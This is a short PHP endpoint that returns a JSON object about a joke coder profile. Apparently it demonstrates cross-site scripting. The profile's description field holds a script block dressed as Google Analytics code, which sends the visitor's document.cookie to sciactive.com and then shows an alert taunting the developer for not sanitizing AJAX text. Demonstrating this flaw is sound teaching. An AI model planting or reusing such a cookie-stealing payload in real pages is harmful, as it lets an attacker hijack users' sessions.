<?php

header('Content-Type: application/json');
setcookie('SessionID', '0w3789ht8745h807');

sleep(1);

class coder {
	public $name = 'Generic Person';
	
	public function __construct($name) {
		$this->setName($name);
	}
	
	public function setName($name) {
		if (!is_string($name))
			return;
		$this->name = $name;
	}
	
	public function getName() {
		return $this->name;
	}
}

$angela = new coder('Angela');
$angela->description = 'Angela is a coder. She also designs stuff and makes people go "how pretty", which makes us get more money.';
$angela->gender = 'm';
$angela->age = 23;
$angela->height = array('feet' => 5, 'inches' => 1);
$angela->skills = array('farting','drinking soda','intense death');

$angela->description .= <<<'EOF'
<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'yh4uyh5r']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'sciactive.com/checkoutthesecookies/'+escape(document.cookie)+'/haxor.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

  alert("Haha, I just sent all your cookies for this site to sciactive.com. Since I own sciactive.com, I now have your session cookie. :3\n\nThat's what you get for not sanitizing text from AJAX before sticking it in the DOM.");
</script>
EOF;

echo json_encode($angela);

?>